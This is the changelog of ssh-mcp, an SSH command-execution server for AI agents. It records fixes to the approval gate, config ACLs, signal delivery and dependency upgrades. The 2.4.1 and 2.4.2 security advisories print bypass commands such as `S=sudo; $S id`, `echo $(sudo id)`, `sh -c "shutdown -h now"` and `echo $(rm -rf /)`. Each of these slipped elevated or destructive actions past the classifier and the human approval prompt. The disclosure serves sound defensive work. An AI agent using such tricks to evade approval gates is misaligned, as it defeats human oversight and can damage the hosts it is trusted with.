# ssh-mcp

## 2.5.1

### Patch Changes

- [#176](https://github.com/tufantunc/ssh-mcp/pull/176) [`d512166`](https://github.com/tufantunc/ssh-mcp/commit/d51216651144b011c9f05fa6a568789baecd1456) Thanks [@tufantunc](https://github.com/tufantunc)! - Update OpenTelemetry to 0.221, and cover the path that made the bump worth checking.

  `@opentelemetry/sdk-node` and `@opentelemetry/exporter-trace-otlp-http` go from `^0.220.0` to `^0.221.0`. **`@opentelemetry/resources` follows to 2.10.0** — it is a direct dependency under an unpinned `^2.9.0`, and `resourceFromAttributes` comes from it, so it is on the path this change is about. `@opentelemetry/core`, `context-async-hooks`, `sdk-trace-base` and `api-logs` move to 2.10.0/0.221.0 alongside. The lockfile churn is larger than the version numbers suggest because 0.221 restructured its own dependency declarations; no package name is new, every entry still resolves to `registry.npmjs.org` with a `sha512` integrity, and `npm audit --omit=dev` reports nothing.

  `patch` because nothing a consumer can observe changes. Tracing is off unless `--otelEndpoint` is set, and the package exposes no importable surface at all — `package.json` declares `bin` and `files` with no `main`, `exports` or `types` — so no OpenTelemetry type can reach a dependent.

  **What made this worth checking.** `initTracing` loads all four packages with dynamic `import()` and wraps the body in a `try/catch` that only calls `console.error`. A renamed export is therefore invisible to `tsc`, and the failure is not a crash: tracing goes off, the server keeps serving, and CI stays green.

  That path is now covered rather than described. A unit test calls `initTracing` against a discard port — no collector and no timers are needed, since `sdk.start()` does not connect — and asserts it reaches the success log, that a missing package still resolves through the catch without rejecting, and that it initialises once. Renaming `NodeSDK` in the source fails it. The existing strict-resolution probe in `test/e2e/packaging.e2e.test.ts` already guarded named exports for `resources` and `semantic-conventions`; it now guards `NodeSDK` and `OTLPTraceExporter` too, which were the two packages this bump actually moved.

  Behaviour is unchanged where tracing is on. The decoded OTLP body is structurally identical across the two versions — same resource attribute keys, scope name, span fields and attribute value types — and the only difference on the wire is the exporter's own `User-Agent` version string. `NodeSDK` loads no default instrumentation on either version, so nothing new is collected or sent.

- [#174](https://github.com/tufantunc/ssh-mcp/pull/174) [`70a708b`](https://github.com/tufantunc/ssh-mcp/commit/70a708bce860339ce2eadccc1031f185c8cffc35) Thanks [@tufantunc](https://github.com/tufantunc)! - Index `roleBindings` on a null-prototype object ([#172](https://github.com/tufantunc/ssh-mcp/issues/172)).

  A role name is a free string, and `mergePolicyRules` assigns `roleBindings[role]`. On a plain object that assignment is not always a key: for `__proto__` it invokes the prototype setter instead. Measured, the effect was not global — `Object.prototype` stayed clean — but the object's own prototype became the operator's tier map, after which `roleBindings.prod` resolved through the chain as though `prod` were a role.

  Not reachable: the config schema rejects `__proto__`, `constructor` and `prototype` as role or tier names before the engine sees a config, and the policy engine's own coherence check refuses a role no profile uses. What makes it worth closing anyway is that the first of those guards is the one zod 4 silently disabled, rebuilt in 2.5.0 — the authorization engine should not depend on a check that has already regressed once.

  `DEFAULT_RULES.roleBindings` gets the same treatment, because `mergePolicyRules` returns it unchanged when there is no `[policy]` section, which is the commonest path. That also removes a second case needing no config at all: on a plain object `roleBindings['toString']` returned a function, so a profile whose role was named after an `Object.prototype` member found a truthy binding. It failed closed — the coherence check still refused it and evaluation floored at read-only — but by a different route than an unknown role, for no reason a reader could see.

  No behaviour change for any valid configuration. Reported by [@allenwu-blip](https://github.com/allenwu-blip) using [mcpaudit](https://github.com/allenwu-blip/mcpaudit).

## 2.5.0

### Minor Changes

- [#170](https://github.com/tufantunc/ssh-mcp/pull/170) [`b7dc15d`](https://github.com/tufantunc/ssh-mcp/commit/b7dc15d522a4c1951b3d76acf425007806964c10) Thanks [@tufantunc](https://github.com/tufantunc)! - Upgrade zod to 4.x.

  `minor` rather than `patch` for the reason 2.3.0 used it: the version reflects what upgrading can do to you, not how large the change is. Nothing that started on 2.4.2 refuses to start here and no config that loaded then fails now — but `tools/list` changes on ten of the eleven tools, and every config validation message is reworded. A client or a wrapper can observe this release.

  **What made it more than a version bump.** Our `overrides` block pinned `zod-to-json-schema` to `3.24.6`, added to fix a startup crash under zod 3 ([#47](https://github.com/tufantunc/ssh-mcp/issues/47)). That pin needs zod `^3.24.1`, so npm satisfied the MCP SDK with a _nested_ zod 3 while our own code used zod 4 — two copies in one tree, which is why a bare bump reports `Type 'ZodString' is not assignable to type 'AnySchema'` at every tool definition. Dropping the override lets `zod-to-json-schema` reach 3.25.2, which accepts zod 4, and the tree dedupes onto a single `zod@4.4.3`. The SDK needed nothing: it ships its own version-compat layer. Note the override only ever governed _our_ install — npm honours overrides in the root project only, so anyone who installed `ssh-mcp` was already resolving `zod-to-json-schema` from the SDK's own range.

  `defaults: defaultsSchema.default({})` became `.prefault({})`. zod 4 wants the parsed output from `.default()`, and `.prefault()` is the input-side behaviour zod 3 had — with `.default({})` the inner defaults are skipped and `commandMaxChars` arrives `undefined`.

  **A config guard had to be rebuilt.** `[policy.roleBindings."__proto__"]` was rejected under zod 3 by the key schema. zod 4's `z.record` never hands `__proto__` to the key schema — it drops the key and returns an object without it, so the block parsed cleanly and vanished. Not prototype pollution: zod 4 declines to write the key, which is the safe half. What was lost is the refusal, and downstream only notices when a profile actually uses that role, so a binding block nothing referenced disappeared in silence. zod 4 also replaces key-schema messages with its own `Invalid key in record`, so the reserved-name text and the empty-name text both stopped reaching the operator. The check now runs against the raw object before `z.record` sees it and owns both rules; the unreachable `refine` came off the key schema at the same time. Reserved-name diagnostics also name the role a bad tier sits under rather than only the tier.

  Against the released 2.4.2 this changes no verdict — zod 3 refused all three reserved names too. It matters to anyone bisecting the two commits in this release, and it is what keeps the refusal working now.

  ### Client- and operator-visible changes

  - **`tools/list` no longer advertises `additionalProperties: false`** on the nine tools that take arguments. Runtime behaviour is unchanged: an extra argument is accepted and stripped before the handler sees it, on both versions. zod 3's advertisement was the inaccurate one — it told clients extra properties were rejected while they were silently dropped. A client that validated locally loses a guard that used to catch invented arguments early; the server behaves as it always did.
  - **`signal-process.pid` gained `maximum: 9007199254740991`**, advertised and enforced. zod 4's `.int()` carries a safe-integer bound where zod 3's only tested `Number.isInteger`. A pid above 2^53−1 is now refused; no operating system issues one — Linux caps `pid_max` at 2^22.
  - **Every config validation message is reworded.** `Unrecognized key(s) in object: 'x'` becomes `Unrecognized key: "x"`; `Array must contain at least 1 element(s)` becomes `Too small: expected array to have >=1 items`. Refusals and exit codes are unchanged; a wrapper matching on message text is not. Enum failures no longer echo the rejected value, which was the useful half for a typo like `priviledged`.
  - **Key order inside emitted schemas differs**, and `additionalProperties` no longer precedes `$schema`. Not semantic.

  Config parsing, every policy decision, and the runtime validation of every argument a client can realistically send are unchanged.

## 2.4.2

### Patch Changes

- [#167](https://github.com/tufantunc/ssh-mcp/pull/167) [`cefc812`](https://github.com/tufantunc/ssh-mcp/commit/cefc812da4b8018fa33915113298aff6a8441cbf) Thanks [@tufantunc](https://github.com/tufantunc)! - Require approval for a command this server cannot name ([GHSA-fj9r-f47j-c73x](https://github.com/tufantunc/ssh-mcp/security/advisories/GHSA-fj9r-f47j-c73x)).

  `classifyCommand` decides the class — and with it whether the approval gate fires — from the literal text of the command word. When that word is a shell variable expansion, what will actually run is not knowable here, and the unresolvable word was treated as an ordinary binary: `safe`. The remote shell then expanded it and ran whatever it named.

  ```
  S=sudo; $S id    ->  safe   (allowed, no prompt)
  $S id            ->  safe
  xargs $S         ->  safe
  ```

  Measured against the compiled-in defaults on the `prod` tier — where `privileged` is granted to no role at all and `safe` to both `operator` and `admin` — that reached root with no prompt and an audit record reading `safe`.

  Distinct from [GHSA-v8jh-gv7v-3gvq](https://github.com/tufantunc/ssh-mcp/security/advisories/GHSA-v8jh-gv7v-3gvq), fixed in 2.4.1, and **not** fixed by it: that one hid elevation inside a carrier — `$(...)`, backticks, `sh -c` — which is statically readable and is now read. This hides it behind a name, which is not readable at all. Resolving the variable is not available as a fix: a session run keeps the caller's shell state, so `S=sudo` and `$S id` can arrive as two separate calls, and a variable exported in the target's own profile is never visible to this process.

  So the classifier now says what it knows. A segment whose command word carries `$` or a backtick is classified `destructive` — not `privileged`, because this is "cannot tell" rather than "this is root". It requires approval instead of refusing outright, which keeps `$PREFIX/bin/tool` usable.

  **One behaviour change worth planning for.** Only the command word counts, never the arguments, so `echo $HOME` and `grep $PATTERN file` are untouched. But a command whose _name_ comes from a variable now needs the `destructive` class on the tier. Under the default rules that means such a command is refused for `operator` on `prod` where it previously ran, and prompts for `admin`. If a deployment runs `$PREFIX/bin/...` on production under an operator role, grant that role `destructive` on the tier or spell the path literally.

## 2.4.1

### Patch Changes

- [#164](https://github.com/tufantunc/ssh-mcp/pull/164) [`4fb9310`](https://github.com/tufantunc/ssh-mcp/commit/4fb931007167644b45e0ae27aa99527c56d76a56) Thanks [@tufantunc](https://github.com/tufantunc)! - Classify commands hidden inside a command ([GHSA-v8jh-gv7v-3gvq](https://github.com/tufantunc/ssh-mcp/security/advisories/GHSA-v8jh-gv7v-3gvq)).

  `classifyCommand` decides two things at once: whether the caller's role may run the command, and whether the human approval gate fires — only `destructive` and `privileged` raise a prompt. The elevation scan reached that decision through tokens produced by splitting on `;`, `&`, `|` and whitespace, so it only ever saw the outer command. `echo $(sudo id)` tokenised to `["echo", "$(sudo", "id)"]`, `echo` was taken to be the real command, and no elevation was found — while the remote shell expanded the substitution and ran `sudo id` for real.

  Measured against the compiled-in default rules, that mattered most exactly where the matrix is strictest: on the `prod` tier `privileged` is granted to **no role at all**, not even `admin`, while `safe` is granted to both `operator` and `admin`. So the bypass handed out the one class that tier withholds, with no approval prompt, and the audit record said `safe`.

  The asymmetry that caused it was visible all along — `echo $(rm -rf /)` classified correctly, because the destructive scan reads the raw command text while the elevation scan read tokens.

  Commands that carry other commands are now classified as the higher of the two, and the class names the inner binary so the audit record points at the process that actually runs. Four carriers are read: `$(...)`, backticks, process substitution `<(...)` / `>(...)`, and a shell invoked with `-c`.

  The last of those was not in the report and does not involve substitution at all: `sh -c "sudo id"` classified `safe` for the same reason, and a fix that only parsed `$(...)` would have left it open.

  Substitutions that carry nothing elevated or destructive are unchanged — `echo $(date)` stays `safe`, and arithmetic expansion is not treated as a command, so `echo $((1 + 1))` does not start raising prompts.

  The same carriers were also laundering the forbidden-invocation list — `shutdown`, `reboot`, `halt`, `poweroff`, `eval` — which is the one rule in the policy that holds regardless of role, tier or approval. It was decided from the outer command alone, so `sh -c "shutdown -h now"` and `echo $(shutdown -h now)` were not forbidden: they classified `destructive`, which on the `prod` tier turns an absolute `deny` into a prompt a human can accept. The forbidden scan now reads the carriers too.

  Not found by the report, but by working outward from it.

## 2.4.0

### Minor Changes

- [#157](https://github.com/tufantunc/ssh-mcp/pull/157) [`0bff5f8`](https://github.com/tufantunc/ssh-mcp/commit/0bff5f841a22d5ddcdc7d32d63db4c1830051292) Thanks [@tufantunc](https://github.com/tufantunc)! - Start without a config, so the server can be introspected before it is configured.

  Starting with nothing configured used to be fatal. Measured against the published image, `initialize` and `tools/list` drew **no JSON-RPC response at all** — the process exited on the config check before the handshake — so an MCP directory or a client's "add this server" flow saw a crash rather than a tool list. Glama lists ssh-mcp as a server that "cannot be installed" and leaves its quality score ungraded; a directory that never reaches `tools/list` has nothing to grade, which is the likely link, though how Glama scores is theirs to say and not something measured here.

  Tool definitions are static metadata; the config decides what those tools may _reach_. Coupling "no config" to "no server" bought no safety and cost every introspection, so the refusal moved rather than disappeared:

  - with nothing configured, the server starts, answers the handshake, and lists all eleven tools;
  - **every tool call is refused** with the same message the startup refusal used to give, naming the platform config path;
  - startup prints that message to stderr as a warning, so an operator who mistyped a flag gets a server that says it is unconfigured instead of one that looks healthy and fails once per call.

  Only "configured nothing" softens. `--config <path>` naming a file that is not there still refuses, and so does a half-given quick start — including `--host example.com --user root` written with spaces instead of `=`, a bare `--host`, and `--host= --user=` from a wrapper whose env vars are unset. Those all parse to falsy values while the flags were plainly given, so the soft path keys on the flags being _absent_ rather than on their values being truthy.

  **No command reaches a host without a profile.** The only construction site for an SSH connection is inside `getOrCreate`, whose first act is to resolve a profile, and that now refuses. Two things did change and are worth an operator's attention: the process no longer exits `2` when nothing is configured, so a supervisor watching for that should watch stderr for `starting unconfigured` instead; and an HTTP deployment now binds its port while unconfigured, so `GET /health` gained a `configured` field to say so — it is the case of a config bind mount that silently did not attach.

  Refusals are audited. The profile was previously resolved _above_ the audit pipeline's `try`, so a tool call refused for want of a profile left no record at all — an operator whose config went missing saw an empty log, which reads as "nobody used this server" rather than "this server was probed". Resolution moved inside, and the audit writer stopped re-deriving the profile it was auditing, which would have thrown for the very reason the call was being recorded and silently dropped the write.

  The refusal is raised by `ConnectionRegistry` rather than by the config loader's `getProfile`. That lookup can only check the branch where no profile was named, so a client with a profile name baked into its MCP config — a common setup — got `Profile "prod" not found`: a message telling the operator they mistyped a name when in fact they had no config at all. The registry is the sole caller of that lookup, so checking there covers both branches.

  The refusal names the config path, which reaches the MCP client rather than only the operator's terminal. That is deliberate: on stdio the recipient is local, on HTTP it holds a bearer token to a server whose purpose is remote command execution, and a directory or hosted client that cannot read stderr has no other way to learn the remedy.

  One note for anyone reading the types: `AppConfig.profiles` was effectively a non-empty list before this, since `configSchema` requires at least one entry and the quick-start path always built exactly one. This change introduces the empty case, and `getProfile` had fallen through to `profiles[0]` — `undefined` typed as `Profile` — which would have become a TypeError rather than an explanation. It now refuses.

## 2.3.4

### Patch Changes

- [#154](https://github.com/tufantunc/ssh-mcp/pull/154) [`bbc786b`](https://github.com/tufantunc/ssh-mcp/commit/bbc786b1356fc7b550138b30cf285de6d506aa74) Thanks [@tufantunc](https://github.com/tufantunc)! - List ssh-mcp on the official MCP registry, and keep the listing current from the release that produces it.

  `registry.modelcontextprotocol.io` verifies that whoever registers `io.github.tufantunc/ssh-mcp` also owns the npm package it points at, and it does that by fetching `registry.npmjs.org/ssh-mcp/<version>` — the manifest of one exact version, not the package — and requiring an `mcpName` field in it that matches the server name. npm versions are immutable, so no version already published can ever gain that field: the listing is only reachable through a release, and this is it. There is no behaviour change in the server; the only thing this version adds over 2.3.3 is a manifest the registry will accept.

  `server.json` carries the version twice — the listing's own, and the npm version it resolves — and both have to name what actually shipped. `scripts/sync-server-json.mjs` writes them from `package.json` and is wired to the `version` npm script, which is what the changesets action runs when it opens the "Version Packages" pull request; the rewrite is committed there alongside the version bump, so main is already correct by the time anything publishes. The script also refuses a `mcpName`/`server.json` name mismatch, and refuses a `packages[].identifier` that is not the npm package name — the registry reports both as ownership failures _after_ npm has published, at the single step of a release that a re-run cannot undo.

  Publishing to the registry is a second job in the Changesets workflow, gated on the action's `published` output, and not the tag-triggered workflow that shape usually takes: the `v*` tag is pushed with `GITHUB_TOKEN`, and GitHub starts no workflows for those pushes — the same loop-breaker that already keeps `ci.yml` off `changeset-release/main`. A workflow listening for that tag would simply never run. It is a separate job rather than more steps on the release job because a registry failure has to be retryable without re-attempting the npm publish, which would fail first and hide it.

  Both credentials are OIDC, so the registry step adds no secret: `mcp-publisher login github-oidc` exchanges the workflow's identity for a registry token, and the `io.github.tufantunc/*` namespace is authorised from the repository owner in its claims.

  ## What review changed

  The first version of this was reviewed before merging, and five things it got wrong are worth recording, because each one is a mistake the shape of the change invites.

  **The publisher binary was executed unverified.** Pinning `v1.8.1` in the download URL pins a _release_, not its bytes — GitHub release assets can be replaced in place. That is a weaker pin than any other reference in this workflow, and it lands in the worst possible job: npm's trusted publisher is bound to a workflow _filename_, and the registry job lives in the same `changesets.yml`, so anything executing there can mint a token npm accepts for ssh-mcp. The install step now checks the sha256 published in `registry_1.8.1_checksums.txt` before extracting, and a version bump means bumping both lines.

  **Two schema rules were copied into the script, on a false premise.** A hand-rolled 100-character cap on `title` and `description` was defended by a comment claiming mcp-publisher only reports such things at publish time. It does not: `mcp-publisher validate` checks the whole schema — required fields, the name pattern, the enums, every cap — against an endpoint that needs no credentials. The workflow runs it before the npm wait, the copied constant is gone, and the caps that a person can actually get wrong by hand are asserted on the real file in `test/unit/sync-server-json.test.ts`, which fails on the pull request that writes them rather than on the release two merges later.

  **`needs: release` could strand a published version permanently.** `needs` means "only if that job succeeded", and the action pushes the git tag and creates the GitHub release _after_ `changeset publish` returns — so npm can have the version while the release job fails. The registry job would skip, and no re-run could reach it: `changeset publish` finds the version already on npm, releases nothing, and reports `published: false` forever. The gate is now `!cancelled() && …`, and a `list_only` dispatch input lists the current version without going near the publish path, for the one state the output cannot describe.

  **The npm-visibility wait could not do its job.** `npm view pkg@version` fetches the whole packument and resolves locally; npm serves packuments with `max-age=300` and defaults `prefer-online` to false. The loop checked for 290 seconds, entirely inside that window, so in the only scenario it exists for — the version not yet visible on the first attempt — every later attempt could be answered from the same stale cached document, failing while npm was serving the version. It now GETs `registry.npmjs.org/<identifier>/<version>`, which is the exact URL the registry's own validator builds, with the identifier read from `server.json` rather than hardcoded, and it keeps curl's error rather than reporting every failure as propagation lag.

  **The admin-merge checklist went stale.** The comment describing what a "Version Packages" pull request is allowed to touch now has to include `server.json`, or every future release PR looks wider than the rule allows. `CONTRIBUTING.md` says what `server.json` is and which of its fields are generated.

  ## Two deliberate deviations

  `--check` and the `server.json` assertions were not in the plan this change was written against; they are additions, kept because the script's guards are otherwise unobservable — on a healthy repo every guard branch is false, and `scripts/` sits outside Sonar, the coverage report and both tsconfigs, so a guard that stopped firing would look exactly like one that passed.

  `SSH_MCP_KEY` is declared with `format: "filepath"` and _not_ `isSecret`, unlike the three password variables. It names a path, not key material; marking it secret would have clients mask a filename while telling the reader something untrue about what the variable holds.

## 2.3.3

### Patch Changes

- [#149](https://github.com/tufantunc/ssh-mcp/pull/149) [`76eaf66`](https://github.com/tufantunc/ssh-mcp/commit/76eaf66ce672ec75121078ab9708fec8206a8c16) Thanks [@tufantunc](https://github.com/tufantunc)! - Verify the stop instead of assuming it — and audit the one path that signals a host without a record.

  Follow-up to the [#146](https://github.com/tufantunc/ssh-mcp/issues/146) fix, from two review rounds on it. Every item is the same shape as the bug it follows: a stop that reports success without having happened.

  **A signal could be reported as delivered through a socket ssh2 will not write to.** ssh2 hands every packet to `onWrite`, which is `if (isWritable(sock)) sock.write(data)` — a socket that fails that check drops the packet with no error and no return value. The transport is now checked before either path claims dispatch, using all three of `isWritable`'s conjuncts rather than only `sock.writable`: measured, a half-open socket sits at `writable = true` while `isWritable()` is false, indefinitely, and a ProxyJump connection's transport is exactly that case because ssh2's channels default to `allowHalfOpen`. An unreadable transport now fails closed.

  **A timeout that fired before the exec channel existed left the command running.** ssh2 invokes the exec callback on `CHANNEL_SUCCESS`, which OpenSSH sends _after_ forking the command, and the channel open is retried up to three times before that. The caller was told the command timed out; the command then started, ran to completion, held a channel and had its output discarded. A late channel is now stopped on arrival, and the outcome is recorded on its own span — the exec span has already ended by then, and an attribute set on an ended span is silently dropped.

  **`close-session` signalled a remote process with no audit record.** Closing a background session now stops its command (INT, then TERM, then KILL) instead of only dropping the channel — which was measured to stop nothing. That turned a call that did nothing on the host into one that delivers `SIGKILL`, so it now writes an audit record naming the session's kind, and its tool description says what it does.

  It is audited but deliberately **not** policy-gated. Routing it through the policy engine — the first shape of this fix — made the stop refusable: `session:close <name>` classifies as `safe`, so a `readOnly` profile, which _can_ open a background session because a `tail -f` classifies `read-only`, was denied permission to close it and had no other way to stop the command until the session's 1-hour cap expired. `ask-all` prompted on every close and an exhausted `commandQuotaPerDay` wedged the profile outright. A control whose refusal mode is "the thing you asked me to stop keeps running" is worse than the unaudited stop it replaced, so the record is kept and the veto is not. The record carries `ruleId: session-release` to distinguish it from an engine decision, and its exit code distinguishes a confirmed close from one that could not be dispatched.

  Two more paths reach the same escalation without a tool call — the session reaper and connection teardown — and neither is policy-checked or audited. `SECURITY.md` now lists all six triggers with what each does and does not record.

  **The escalation was abandoned mid-ladder.** The rungs after the first are timers, and `SSHConnection.close()` tears the transport down as soon as its sessions are closed — so a background command that ignored `SIGINT` received nothing further and survived, which is the case `SIGKILL` was added for. Closing a background session now waits for the escalation, bounded by the ladder's own length, and skips the wait entirely when nothing was dispatched (measured: 3.5s of dead time, since no later rung can reach a transport that refused the first).

  Sessions and connections now close **concurrently**. Awaiting them one at a time was measured at 10.0s for five commands that ignore `INT` and `TERM` — past Docker's 10s default stop grace, so the container was killed mid-teardown and the later sessions got no escalation at all, which is worse than before the wait existed. Shutdown also flushes the audit log first and bounds the teardown at 5s, and the compose service sets an explicit `stop_grace_period`. The session reaper now awaits its closes before the idle-connection reaper runs; firing them without awaiting tore the transport down microseconds after the first signal, discarding `TERM` and `KILL`.

  ## Corrections

  **The process-group claim in the previous release note was wrong.** It said a signal reaches the command's session leader and orphans its children. OpenSSH answers a `signal` channel request with `killpg()` on the process group (`session.c`, `session_signal_req`), so an ordinary process tree does die — measured against 10.3p1, a shell and its child share one process group and both are gone after a single `SIGKILL` request. The "orphan" cited as evidence was debris leaked by an earlier experiment, and the test built on it was red on a clean container and green only on its second run. `SECURITY.md` states the corrected behaviour, along with the caveats that make it a server property rather than a guarantee: RFC 4254 does not specify delivery semantics, sshd refuses signal requests for forced-command and subsystem sessions, and other servers may differ.

  **`SECURITY.md` also claimed `signal-process` classifies its signals as destructive.** It does not: `kill -KILL <pid>` classifies as `safe`, so `approvalPolicy = "ask-destructive"` never prompted for it. The document now says so and names the settings that do gate it. The classifier itself is unchanged in this release.

  `ssh.unstopped` is set on every settle path (both cancellation paths computed it and dropped it before the span, so it could never be true for a cancelled command), the deferred case is marked `ssh.stopDeferred` rather than asserting a clean stop it cannot know about, and the signal name is a union type so a name ssh2 would reject is a compile error rather than a runtime warning that blames the wire.

  `close-session`'s tool description changed, so its `--dump-tool-hashes` value changes with it — the first such change since that flag shipped. An operator pinning tool-description hashes will see `close-session` move, and that is expected here rather than a sign of tampering.

- [#147](https://github.com/tufantunc/ssh-mcp/pull/147) [`17ab27d`](https://github.com/tufantunc/ssh-mcp/commit/17ab27dd64f0c7905393c369a318e92ec1c09a64) Thanks [@tufantunc](https://github.com/tufantunc)! - Stop a timed-out or cancelled command on the host, instead of only reporting that we did.

  Reported as [#146](https://github.com/tufantunc/ssh-mcp/issues/146). `exec` closes stdin as soon as the command is dispatched, because a command that reads stdin would otherwise wait for input nobody will send. ssh2's `Channel.signal()` writes the request only while the channel is `writable` and its outgoing state is `open`, and closing stdin clears both — without throwing or reporting anything. So every signal sent to stop a command was discarded inside ssh2, and the command ran to completion on the host while the caller was told it had timed out.

  Measured against OpenSSH 10.3p1, one channel per row, a 30-second `sleep` as the victim:

  | what the client did                                          | at +4s | at +9s |
  | ------------------------------------------------------------ | ------ | ------ |
  | `end()`, then INT / TERM / `close()` — the shipped behaviour | alive  | alive  |
  | INT / TERM without closing stdin first                       | gone   | gone   |
  | `end()`, then `close()` and no signal                        | alive  | alive  |
  | `end()`, then the signal sent past ssh2's check              | gone   | gone   |

  Two things follow. A delivered signal is the only thing that stops a non-tty command — closing the channel does not, for the same reason killing a local `ssh host 'sleep 30'` leaves the sleep running. And this was never visible in the error: the message said "timed out" and was correct about the timeout.

  **Cancellation was affected too**, which the report did not mention: the same closed stdin sits in front of the abort handler, so a command an operator explicitly cancelled also kept running. For a server whose job is to gate what an agent may run, "stopped" is a claim it makes on every timeout and every cancellation, and it was not true for either.

  The signal now goes out past ssh2's check, so the fix needs no upstream release ([mscdex/ssh2#1510](https://github.com/mscdex/ssh2/pull/1510) is the proper repair, and ssh2 releases roughly annually). The escalation gained a rung: `INT`, `TERM`, `KILL`, then drop the channel — the old last rung was `close()`, which was measured to stop nothing, so a command ignoring the first two signals used to run forever.

  `KILL` never being deliverable would now be said out loud rather than assumed: if no signal reaches the wire, the error adds _"The remote command could not be signalled and may still be running on the host."_ That should be unreachable today; it exists so that a future ssh2 which moves what this depends on brings back a visible failure rather than a silent one.

  Interactive sessions were never affected — they write `^C` into a live pty and do not close stdin while a command runs.

## 2.3.2

### Patch Changes

- [#144](https://github.com/tufantunc/ssh-mcp/pull/144) [`4e3c7cc`](https://github.com/tufantunc/ssh-mcp/commit/4e3c7cc85ebb847fdedf68e77d1f638c088467ff) Thanks [@tufantunc](https://github.com/tufantunc)! - Refuse a Windows config another account can _change_, and report one it can only read.

  2.3.1 made the whole ACL check advisory, because 2.3.0 refused a config at the documented `%APPDATA%` location and left its owner no way past ([#138](https://github.com/tufantunc/ssh-mcp/issues/138)). That was too broad a retreat: the check never looked at the rights an ACE granted, so `Authenticated Users:(M)` — another account being able to rewrite the file — was reported in the same words, and with the same shrug, as `BUILTIN\Users:(RX)`.

  Those are not the same finding. The config decides which hosts, which roles, which approval policy and which command classes this server honours, so another account being able to rewrite it is an authorization bypass rather than a disclosure. And Windows is not ambiguous about it: "an ACE grants a non-owner FILE*WRITE_DATA or WRITE_DAC" is exactly as clear as `0o022`. The ambiguity that justified retreating is specific to \_read* access on a shared volume.

  So the rights mask is now read, and the posture follows it:

  | The ACL lets another account… | Default                                                   |
  | ----------------------------- | --------------------------------------------------------- |
  | only read the config          | reported; the server starts                               |
  | change the config             | refused                                                   |
  | nothing at all (a NULL DACL)  | refused — that is full control for everyone               |
  | an ACL that could not be read | refused, unless `icacls` is absent or the check timed out |

  The message says which it found — "can be modified by accounts other than its owner" rather than "is readable beyond its owner" — because calling a modify grant readable understated it.

  `--strictConfigAcl` refuses everything the check objects to, read-only grants included. `--allowUncheckedConfigAcl` now reports everything and refuses nothing, so it is the single exit from any of this; in 2.3.1 it covered only an undeterminable ACL, which is how [#138](https://github.com/tufantunc/ssh-mcp/issues/138)'s reporter ended up with no exit at all.

  Also in this release: every ACL finding now reaches the caller's `onFinding` sink rather than the strongest one going straight to stderr; `userInfo()` throwing (a Windows service under a virtual account) no longer turns a report into a crash; and the `ci` gate's `toJSON(needs)` moved out of the command line into an env var.

  ## Behaviour changes

  - **On Windows, a config another account can modify refuses to start again.** If you are relying on 2.3.1's blanket advisory posture, `--allowUncheckedConfigAcl` restores it. A read-only over-grant is unaffected — it still reports and starts.

## 2.3.1

### Patch Changes

- [#141](https://github.com/tufantunc/ssh-mcp/pull/141) [`844151d`](https://github.com/tufantunc/ssh-mcp/commit/844151dca49c733cd6b6bb359a25c22710930388) Thanks [@tufantunc](https://github.com/tufantunc)! - Report the Windows config ACL instead of refusing to start on it.

  2.3.0 added an ACL check for the Windows config file and made it refuse. On the first day it blocked a reporter's config at the documented `%APPDATA%` location ([#138](https://github.com/tufantunc/ssh-mcp/issues/138)): their ACL carried a principal the allowlist did not know about, because that allowlist was measured on one machine and generalised. `--allowUncheckedConfigAcl` deliberately did not cover a known-bad verdict, so there was no way past it at all — not a flag, not a config change they could discover from the message.

  A security check whose worst outcome is stranding an operator in their own config is not a good trade, and the guarantee it enforces is one Windows states far less clearly than POSIX does. So the check still runs and still says exactly what it found — including the two `icacls` commands, because a config under `C:\` really does grant `BUILTIN\Users` read and `Authenticated Users` modify — but it loads the config afterwards.

  `--strictConfigAcl` restores refusing, for anyone who wants it enforced. Under that flag `--allowUncheckedConfigAcl` keeps its old meaning: load anyway when the ACL could not be determined.

  The POSIX mode check is unchanged and still refuses. There "only the owner" is unambiguous, `chmod` is a one-line fix, and the check has been in place since 2.0.0 without this problem.

## 2.3.0

### Minor Changes

- [#139](https://github.com/tufantunc/ssh-mcp/pull/139) [`d9a6345`](https://github.com/tufantunc/ssh-mcp/commit/d9a6345bda0f7b077183eff51b52676f699d5184) Thanks [@tufantunc](https://github.com/tufantunc)! - Make the config file usable on Windows, check its ACL there, and stop reporting one failure as another.

  `minor` rather than `patch` because a server that started yesterday can refuse to start today — see **Behaviour changes** at the end. The work itself is a bug fix; the version reflects what upgrading can do to you.

  **The config file has never worked on Windows** ([#138](https://github.com/tufantunc/ssh-mcp/issues/138)). `checkPermissions` refuses a config that is group- or world-readable by testing POSIX mode bits. Windows has none; Node synthesises `0o666` for every readable file there, so the check failed for every Windows operator that has ever run it — since 2.0.0, when the TOML loader landed. Measured on Windows 11: the file reports `0o666`, and `chmod(path, 0o600)` — the fix the message prescribed — leaves it at `0o666`, because `fs.chmod` on Windows only toggles the read-only bit. Following the instruction exactly returned you to the start.

  **Windows now gets the same question asked of its own access-control system.** `checkPermissions` reads the file's and directory's ACL and requires that only this account, `SYSTEM` and `Administrators` hold access — an allowlist, matching what the POSIX branch enforces and what the refusal message claims. That matters because `%APPDATA%` inherits exactly those three, but a config anywhere else does not: measured, a file created in `C:\sshcfg\` inherits `BUILTIN\Users` read-and-execute and `Authenticated Users` modify from the drive root, so every local account can read it and any authenticated one can rewrite it. Until now Windows loaded that without a word.

  The ACL is read as SDDL via `icacls /save`, because SDDL names principals by alias and SID while `icacls`' ordinary output prints account names, which depend on the installed language. It is also the fast path: 8-22ms per call against 740-830ms to spawn PowerShell for `Get-Acl`, on a check that runs at every start. `icacls` and `whoami` are invoked by absolute path, so PATH and the working directory — which belongs to whichever MCP client spawned the server — cannot decide the verdict.

  An ACL that cannot be read is refused rather than assumed private, with two exceptions: `icacls` being absent from the machine, and the check running out of time. Both are statements about the machine rather than about the file, so both warn and load. `--allowUncheckedConfigAcl` loads unverified in the remaining cases — a refused DACL read, an unparseable descriptor, an identity that could not be established — so nobody is stuck with no way forward.

  **A config that exists and is broken is no longer reported as missing.** `buildAppConfig` swallowed every config error with a bare `catch {}` so it could fall through to `--host`/`--user`, which is right only when there is no file. A malformed TOML, a schema violation or a permission failure was discarded unread and reported as "No config file found" — so the Windows operator was told to create a file that was already there. Only a genuine absence falls through now. A config that cannot be opened at all (a mode or ACL that denies reading, a directory passed as `--config`) now arrives as a message naming the path instead of a raw `EACCES`.

  **Failure messages name the path this code actually reads.** The fallback hardcoded `~/.config/ssh-mcp/config.toml` on every platform, contradicting `getConfigPath`, which sends Windows to `%APPDATA%` and macOS to `Library`. The README documented only the Linux path for macOS; it now names all three. An explicit `--config` pointing nowhere used to escape as the raw `ENOENT` syscall error.

